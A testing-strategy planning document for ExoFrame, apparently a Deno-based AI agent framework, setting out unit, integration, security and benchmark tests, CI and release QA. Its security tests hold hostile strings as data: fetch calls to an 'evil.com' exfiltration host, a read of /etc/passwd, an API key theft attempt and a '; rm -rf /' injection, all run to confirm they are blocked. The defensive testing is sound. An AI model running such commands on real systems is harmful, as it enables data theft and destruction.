# ExoFrame Testing Strategy

- **Version:** 1.0.0
- **Release Date:** 2025-11-30
- **Status:** Planning Document
- **Reference:** [Implementation Plan](./ExoFrame_Implementation_Plan.md) Phase 6

---

## 1. Overview

This document defines the testing strategy for ExoFrame, covering:

- Test types and their purposes
- v1.0 test scope and priorities
- Pre-release test execution requirements
- Test infrastructure and tooling

### Testing Philosophy

ExoFrame follows a **test pyramid** approach:

```
      ┌─────────────┐
      │   Manual    │  ← Pre-release QA
      │     QA      │     (10 scenarios)
     ─┴─────────────┴─
    ┌─────────────────┐
    │   Integration   │  ← Workflow tests
    │      Tests      │     (10 scenarios)
   ─┴─────────────────┴─
  ┌───────────────────────┐
  │      Unit Tests       │  ← Component tests
  │   (per module)        │     (target: 70% coverage)
 ─┴───────────────────────┴─
┌───────────────────────────┐
│     Mock Infrastructure   │  ← MockLLM, TestEnvironment
└───────────────────────────┘
```

### Key Principles

1. **Deterministic by default** — Tests use mock LLM, not real APIs
2. **Isolated** — Each test creates/destroys its own environment
3. **Fast** — Full suite completes in under 2 minutes
4. **CI-first** — All automated tests run on every PR

---

## 2. Test Categories

### 2.1 Unit Tests

**Purpose:** Verify individual components work correctly in isolation.

**Location:** `tests/` (mirroring `src/` structure)

**Coverage Target:** 70% for core modules

| Module           | Test File                              | Priority |
| ---------------- | -------------------------------------- | -------- |
| Config loader    | `tests/config_test.ts`                 | P0       |
| YAML parser      | `tests/parsers/yaml_parser_test.ts`    | P0       |
| Security service | `tests/security_test.ts`               | P0       |
| Database service | `tests/database_test.ts`               | P0       |
| Lease manager    | `tests/leases/lease_manager_test.ts`   | P0       |
| File watcher     | `tests/watcher/watcher_test.ts`        | P1       |
| Context loader   | `tests/context/context_loader_test.ts` | P1       |
| Git service      | `tests/git/git_service_test.ts`        | P1       |
| Blueprint parser | `tests/blueprints/blueprint_test.ts`   | P1       |
| CLI commands     | `tests/cli/*_test.ts`                  | P2       |

**Running Unit Tests:**

```bash
# Run all unit tests
deno test

# Run with coverage
deno test --coverage=cov_profile
deno coverage cov_profile --lcov > coverage.lcov

# Run specific module
deno test tests/security_test.ts
```

---

### 2.2 Integration Tests

**Purpose:** Verify complete workflows function correctly end-to-end.

**Location:** `tests/integration/`

**v1.0 Scenarios:**

| #  | Scenario                | Description                                 | Validates            |
| -- | ----------------------- | ------------------------------------------- | -------------------- |
| 1  | **Happy Path**          | Request → Plan → Approve → Execute → Report | Core workflow        |
| 2  | **Plan Rejection**      | Request → Plan → Reject → Archive           | Rejection flow       |
| 3  | **Plan Revision**       | Request → Plan → Revise → New Plan          | Revision flow        |
| 4  | **Execution Failure**   | Approved plan fails during execution        | Error handling       |
| 5  | **Concurrent Requests** | Multiple requests processed simultaneously  | Race conditions      |
| 6  | **Context Overflow**    | Request references 50 large files           | Graceful truncation  |
| 7  | **Git Conflict**        | Agent and human edit same file              | Conflict detection   |
| 8  | **Daemon Restart**      | Daemon killed mid-execution                 | State recovery       |
| 9  | **Portal Access**       | Request accesses portal files               | Security enforcement |
| 10 | **Invalid Input**       | Malformed YAML frontmatter                  | Input validation     |

**Test Structure:**

```typescript
// tests/integration/happy_path_test.ts
Deno.test("Happy Path: Request to Report", async (t) => {
  const env = await TestEnvironment.create();

  await t.step("create request", async () => {
    await env.createRequest("Implement login feature");
    await env.waitForPlan();
  });

  await t.step("verify plan created", async () => {
    const plan = await env.getPlan();
    assertExists(plan);
    assertEquals(plan.status, "review");
  });

  await t.step("approve plan", async () => {
    await env.approvePlan();
    await env.waitForExecution();
  });

  await t.step("verify report created", async () => {
    const report = await env.getReport();
    assertExists(report);
    assertEquals(report.status, "completed");
  });

  await t.step("verify git branch", async () => {
    const branches = await env.getGitBranches();
    assert(branches.some((b) => b.includes("feat/")));
  });

  await env.cleanup();
});
```

**Running Integration Tests:**

```bash
# Run all integration tests
deno test tests/integration/

# Run specific scenario
deno test tests/integration/happy_path_test.ts

# Run with verbose output
deno test tests/integration/ --reporter=verbose
```

---

### 2.3 Security Tests

**Purpose:** Verify Deno permission enforcement and path security.

**Location:** `tests/security/`

**Attack Scenarios:**

| Attack Vector            | Test                            | Expected Defense             |
| ------------------------ | ------------------------------- | ---------------------------- |
| **Path Traversal**       | Read `../../../etc/passwd`      | `PermissionDenied` from Deno |
| **Portal Escape**        | Symlink pointing to `/etc`      | Path validation rejects      |
| **Network Exfiltration** | Agent calls `fetch('evil.com')` | `PermissionDenied`           |
| **Env Variable Theft**   | Read `API_KEY` env var          | Only `EXO_*` vars allowed    |
| **Shell Injection**      | Command with `; rm -rf /`       | Command allowlist blocks     |
| **File Overwrite**       | Write to `/System/journal.db`   | Write path validation        |

**Test Implementation:**

```typescript
// tests/security/permission_test.ts
Deno.test("Agent cannot read outside workspace", async () => {
  const result = await runAgentWithPermissions(
    { read: ["/ExoFrame"] },
    `Deno.readTextFile("/etc/passwd")`,
  );

  assertEquals(result.exitCode, 1);
  assertStringIncludes(result.stderr, "PermissionDenied");
});

Deno.test("Agent cannot access unauthorized network", async () => {
  const result = await runAgentWithPermissions(
    { net: ["api.anthropic.com"] },
    `fetch("https://evil.com/exfil")`,
  );

  assertEquals(result.exitCode, 1);
  assertStringIncludes(result.stderr, "PermissionDenied");
});
```

**Running Security Tests:**

```bash
# Run security tests (requires strict permissions)
deno test tests/security/ --allow-read=. --allow-run
```

---

### 2.4 Performance Benchmarks

**Purpose:** Establish baselines and detect regressions.

**Location:** `tests/benchmarks/`

**Metrics & Targets:**

| Metric              | Target             | Regression Threshold |
| ------------------- | ------------------ | -------------------- |
| **Cold Start**      | < 100ms            | +20%                 |
| **Watcher Latency** | < 200ms            | +20%                 |
| **Plan Generation** | < 5s (mock)        | +20%                 |
| **Database Query**  | < 10ms             | +50%                 |
| **Context Loading** | < 500ms (20 files) | +20%                 |

**Benchmark Implementation:**

```typescript
// tests/benchmarks/startup_bench.ts
Deno.bench("Cold start time", async () => {
  const cmd = new Deno.Command("deno", {
    args: ["run", "--allow-all", "src/main.ts", "--version"],
  });
  await cmd.output();
});

// tests/benchmarks/watcher_bench.ts
Deno.bench("File watcher latency", async () => {
  const watcher = new FileWatcher(testDir);
  await Deno.writeTextFile(`${testDir}/test.md`, "content");
  await watcher.waitForEvent();
});
```

**Running Benchmarks:**

```bash
# Run all benchmarks
deno bench tests/benchmarks/

# Compare against baseline
deno bench tests/benchmarks/ --json > current.json
deno run scripts/compare_benchmarks.ts --baseline=baseline.json --current=current.json
```

---

### 2.5 Documentation Tests

**Purpose:** Prevent documentation drift from code.

**Location:** `tests/docs/`

**Test Categories:**

| Category             | Validates                        | Example                              |
| -------------------- | -------------------------------- | ------------------------------------ |
| **Section Presence** | Required sections exist          | "Installation" in User Guide         |
| **CLI Coverage**     | All commands documented          | `exoctl plan approve` has entry      |
| **Link Validity**    | Internal links resolve           | `[Dashboard](./Dashboard.md)` exists |
| **Code Examples**    | Examples are syntactically valid | TypeScript blocks compile            |

**Running Documentation Tests:**

```bash
deno test tests/docs/
```

---

### 2.6 Manual QA

**Purpose:** Catch issues that automated tests miss.

**When:** Before each major release (v1.0, v1.1, v2.0, etc.)

**Platform Matrix:**

| Platform              | Environment         | Required |
| --------------------- | ------------------- | -------- |
| Ubuntu 24.04          | Fresh VM, no Deno   | ✓ v1.0   |
| macOS (Apple Silicon) | Clean user account  | ✓ v1.0   |
| Windows 11 + WSL2     | Ubuntu 22.04 in WSL | ✓ v1.0   |

**QA Scenarios:**

See Section 4 (Pre-Release Checklist) for detailed scenarios.

---

## 3. Test Infrastructure

### 3.1 Mock LLM Provider

**Purpose:** Enable deterministic testing without API calls or costs.

**Location:** `tests/mocks/mock_llm_provider.ts`

**Mock Strategies:**

| Strategy     | Use Case              | Implementation                   |
| ------------ | --------------------- | -------------------------------- |
| **Recorded** | Replay real responses | Hash prompt → lookup response    |
| **Scripted** | Predictable sequences | Return responses in order        |
| **Pattern**  | Dynamic responses     | Match prompt patterns → generate |
| **Failing**  | Error handling tests  | Always throw error               |
| **Slow**     | Timeout tests         | Add artificial delay             |

**Recording Real Responses:**

```bash
# Record LLM responses during manual testing
EXO_RECORD_LLM=true exoctl request "Test task"

# Responses saved to tests/fixtures/llm_responses/<hash>.json
```

**Fixture Format:**

```json
{
  "prompt_hash": "abc123...",
  "prompt_preview": "You are a senior developer...",
  "response": "## Proposed Plan\n\n1. First, I will...",
  "model": "claude-3-5-sonnet",
  "tokens": { "input": 1500, "output": 800 },
  "recorded_at": "2025-11-30T10:00:00Z"
}
```

**Usage in Tests:**

```typescript
import { MockLLMProvider } from "../mocks/mock_llm_provider.ts";

Deno.test("Plan generation uses correct format", async () => {
  const mockLLM = new MockLLMProvider("recorded");
  const runner = new AgentRunner(config, mockLLM);

  const plan = await runner.generatePlan(request);

  assertStringIncludes(plan, "## Proposed Plan");
});
```

---

### 3.2 Test Environment

**Purpose:** Isolated, reproducible test workspace.

**Location:** `tests/helpers/test_environment.ts`

**Features:**

- Creates temporary directory for each test
- Scaffolds complete ExoFrame workspace
- Provides helper methods for common operations
- Automatic cleanup on test completion

**Usage:**

```typescript
import { TestEnvironment } from "../helpers/test_environment.ts";

Deno.test("Example test", async () => {
  const env = await TestEnvironment.create();

  // Create files
  await env.createRequest("Test task");

  // Wait for daemon processing
  await env.waitForPlan();

  // Make assertions
  const plan = await env.getPlan();
  assertExists(plan);

  // Cleanup
  await env.cleanup();
});
```

**TestEnvironment API:**

| Method                       | Description                 |
| ---------------------------- | --------------------------- |
| `create()`                   | Initialize test environment |
| `cleanup()`                  | Remove temp directory       |
| `createRequest(description)` | Create request file         |
| `waitForPlan()`              | Wait for plan generation    |
| `getPlan()`                  | Read current plan           |
| `approvePlan()`              | Move plan to Active         |
| `waitForExecution()`         | Wait for execution complete |
| `getReport()`                | Read generated report       |
| `getGitBranches()`           | List git branches           |
| `getActivityLog()`           | Query Activity Journal      |

---

### 3.3 CI/CD Integration

**GitHub Actions Workflow:**

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1
        with:
          deno-version: v2.x

      - name: Run unit tests
        run: deno test --allow-all

      - name: Check coverage
        run: |
          deno test --coverage=cov_profile
          deno coverage cov_profile --lcov > coverage.lcov

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: coverage.lcov

  integration-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run integration tests
        run: deno test tests/integration/ --allow-all

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run security tests
        run: deno test tests/security/ --allow-read=. --allow-run

  benchmarks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: denoland/setup-deno@v1

      - name: Run benchmarks
        run: deno bench tests/benchmarks/ --allow-all

      - name: Compare with baseline
        run: |
          deno bench tests/benchmarks/ --json > current.json
          deno run --allow-read scripts/compare_benchmarks.ts \
            --baseline=tests/benchmarks/baseline.json \
            --current=current.json \
            --threshold=20
```

---

## 4. Pre-Release Checklist

### 4.1 Automated Tests (Must Pass)

Before any release, all automated tests must pass:

```bash
# Run complete test suite
deno task test:all

# This runs:
# - deno test (unit tests)
# - deno test tests/integration/
# - deno test tests/security/
# - deno test tests/docs/
# - deno bench tests/benchmarks/
```

**CI Status:** All GitHub Actions workflows must be green.

---

### 4.2 Manual QA Scenarios

**Execute on each target platform before major releases:**

| #  | Scenario                  | Steps                                                  | Expected Result                             | Pass/Fail |
| -- | ------------------------- | ------------------------------------------------------ | ------------------------------------------- | --------- |
| 1  | **Fresh Install**         | Clone repo → `deno task setup` → `exoctl daemon start` | Daemon starts, directories created          |           |
| 2  | **Create Request**        | `exoctl request "Test"`                                | Request file created with valid frontmatter |           |
| 3  | **Plan Generation**       | Wait for daemon to process                             | Plan appears in `/Inbox/Plans/`             |           |
| 4  | **Plan Approval**         | `exoctl plan approve <id>`                             | Plan moved to `/System/Active/`             |           |
| 5  | **Execution**             | Wait for agent execution                               | Report created, git branch exists           |           |
| 6  | **Portal Mount**          | `exoctl portal add ~/project MyProject`                | Symlink created, context card generated     |           |
| 7  | **Daemon Crash Recovery** | `kill -9 <daemon_pid>` → restart                       | Leases expired, state recovered             |           |
| 8  | **Database Corruption**   | Delete `journal.db` → restart                          | Error message, recovery instructions        |           |
| 9  | **Invalid Request**       | Create request with malformed YAML                     | Validation error logged, file skipped       |           |
| 10 | **Real LLM Test**         | Run with actual Anthropic/OpenAI API                   | Plan generated, tokens logged               |           |

---

### 4.3 Sign-off Template

```markdown
## QA Sign-off: v[VERSION]

**Tester:** [Name]
**Date:** [Date]
**Platform:** [Ubuntu 24.04 / macOS / Windows WSL2]

### Automated Tests

- [ ] Unit tests pass
- [ ] Integration tests pass
- [ ] Security tests pass
- [ ] Documentation tests pass
- [ ] Benchmarks within threshold

### Manual QA Scenarios

| #  | Scenario              | Pass/Fail | Notes |
| -- | --------------------- | --------- | ----- |
| 1  | Fresh Install         |           |       |
| 2  | Create Request        |           |       |
| 3  | Plan Generation       |           |       |
| 4  | Plan Approval         |           |       |
| 5  | Execution             |           |       |
| 6  | Portal Mount          |           |       |
| 7  | Daemon Crash Recovery |           |       |
| 8  | Database Corruption   |           |       |
| 9  | Invalid Request       |           |       |
| 10 | Real LLM Test         |           |       |

### Issues Found

- [ ] None
- [ ] [Issue #XX: Description]

### Verdict

- [ ] **APPROVED** for release
- [ ] **BLOCKED** - see issues above

**Signature:** _____________________
```

---

## 5. v1.0 Test Scope

### 5.1 In Scope (Must Have)

| Category                | Items                                                                | Status      |
| ----------------------- | -------------------------------------------------------------------- | ----------- |
| **Unit Tests**          | Config, Security, Database, Leases, Watcher                          | 🔲 Planned  |
| **Integration Tests**   | Scenarios 1-5 (Happy Path, Rejection, Revision, Failure, Concurrent) | 🔲 Planned  |
| **Security Tests**      | Path traversal, Network exfil, Env theft                             | 🔲 Planned  |
| **Documentation Tests** | User Guide sections, CLI coverage                                    | ✅ Complete |
| **Manual QA**           | All 10 scenarios on Ubuntu                                           | 🔲 Planned  |

### 5.2 In Scope (Should Have)

| Category                   | Items                                                 | Status     |
| -------------------------- | ----------------------------------------------------- | ---------- |
| **Integration Tests**      | Scenarios 6-10 (Context overflow, Git conflict, etc.) | 🔲 Planned |
| **Performance Benchmarks** | Cold start, Watcher latency                           | 🔲 Planned |
| **Manual QA**              | macOS, Windows WSL2                                   | 🔲 Planned |

### 5.3 Out of Scope (v1.1+)

| Category          | Items                         | Reason          |
| ----------------- | ----------------------------- | --------------- |
| **Flow Tests**    | Multi-agent orchestration     | Phase 7 feature |
| **Load Testing**  | Concurrent users, high volume | Single-user MVP |
| **Fuzzing**       | Random input generation       | Nice-to-have    |
| **Accessibility** | Screen reader, keyboard nav   | No UI in v1.0   |

---

## 6. Risk-to-Test Traceability

Every identified risk maps to at least one automated test:

| Risk ID   | Risk                           | Test File                              | Test Type |
| --------- | ------------------------------ | -------------------------------------- | --------- |
| T-PATH    | Path traversal attack          | `tests/security/permission_test.ts`    | Security  |
| T-LEASE   | Lease starvation (deadlock)    | `tests/leases/heartbeat_test.ts`       | Unit      |
| T-CONTEXT | Context overflow crashes agent | `tests/context/context_loader_test.ts` | Unit      |
| T-GIT     | Git identity drift             | `tests/git/git_service_test.ts`        | Unit      |
| T-WATCH   | Watcher misses file events     | `tests/watcher/stability_test.ts`      | Unit      |
| T-DOC     | Documentation outdated         | `tests/docs/user_guide_test.ts`        | Docs      |
| T-NET     | Unauthorized network access    | `tests/security/permission_test.ts`    | Security  |
| T-ENV     | Env variable theft             | `tests/security/permission_test.ts`    | Security  |

---

## 7. Test Maintenance

### 7.1 Adding New Tests

1. Create test file in appropriate directory (`tests/<category>/`)
2. Follow naming convention: `<feature>_test.ts`
3. Use `TestEnvironment` for integration tests
4. Use `MockLLMProvider` for any LLM interactions
5. Add to CI workflow if new category

### 7.2 Updating Fixtures

```bash
# Re-record LLM responses after prompt changes
EXO_RECORD_LLM=true deno task dry-run

# Update benchmark baselines after optimization
deno bench tests/benchmarks/ --json > tests/benchmarks/baseline.json
git add tests/benchmarks/baseline.json
git commit -m "chore: update benchmark baselines"
```

### 7.3 Flaky Test Policy

- Flaky tests are **bugs** — fix immediately or disable with `TODO`
- Use `Deno.test({ ignore: true }, ...)` for temporarily disabled tests
- Track disabled tests in GitHub issues
- No more than 3 disabled tests at any time

---

_End of Testing Strategy_
